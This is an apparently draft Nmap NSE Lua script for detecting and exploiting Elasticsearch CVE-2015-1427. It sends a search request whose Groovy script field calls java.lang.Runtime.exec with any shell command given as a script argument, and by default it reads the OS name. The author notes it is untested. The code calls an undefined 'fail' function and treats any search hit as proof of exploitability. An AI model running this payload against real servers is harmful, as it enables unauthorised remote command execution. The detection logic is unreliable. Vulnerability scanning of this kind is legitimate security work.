local http = require "http"
local shortport = require "shortport"
local stdnse = require "stdnse"
local string = require "string"
local table = require "table"
local vulns = require "vulns"
local json  = require "json"

description = [[
A simple script based on the exploit mentioned here :
  http://carnal0wnage.attackresearch.com/2015/03/elasticsearch-cve-2015-1427-rce-exploit.html
]]

---
-- @args command enter the shell command to be executed
-- tries to fetch the os name by default
-- @usage
-- nmap --script=http-vuln-cve2015-1427 --script-args <targets>
--
--@output
--  not being able to test the script.
--  the curl commmand by Jordan-Wright not working for me either :/
-- Created 11/3/15

author = "Gyanendra Mishra"

license = "Same as Nmap--See http://nmap.org/book/man-legal.html"

categories = {"vuln", "intrusive"}

portrule = shortport.port_or_service(9200, "http", "tcp")

action = function(host, port)
  
  local command = stdnse.get_script_args(SCRIPT_NAME .. ".command") or false 
  
  local payload
  
  if command then 
    payload = '{"size":1, "script_fields": {"myscript":{"script": "java.lang.Math.class.forName(\\"java.lang.Runtime\\").getRuntime().exec(\\"' .. command .. '\\").getText()"}}}' 
  else 
    payload = '{"size":1, "script_fields": {"myscript": {"script": "java.lang.Math.class.forName(\"java.lang.System\").getProperty(\"os.name\")"}}}'
  end

  local vuln_table = {
    title = "ElasticSearch CVE-2015-1427 RCE Exploit",
    state = vulns.STATE.NOT_VULN,
    risk_factor = "High",
    references = {
      'http://carnal0wnage.attackresearch.com/2015/03/elasticsearch-cve-2015-1427-rce-exploit.html',
      'http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-1427'
    }
  }

  local report = vulns.Report:new(SCRIPT_NAME, host, '9200')
  
  local target = '_search?pretty'
  
  local response = http.post(host,'9200',target,nil,nil,payload) 
  
  if not(response.body) then
    return false
  else
    local status,parsed = json.parse(response.body)
   
    if ( not(status) ) then
      return fail("Failed to parse response")
    end

    if  parsed.hits.hits and type(parsed.hits.hits)=='table' and #(parsed.hits.hits) >0 then
      vuln_table.state = vulns.STATE.EXPLOITABLE
    end   
  end
  
  return report:make_output(vuln_table)  
end
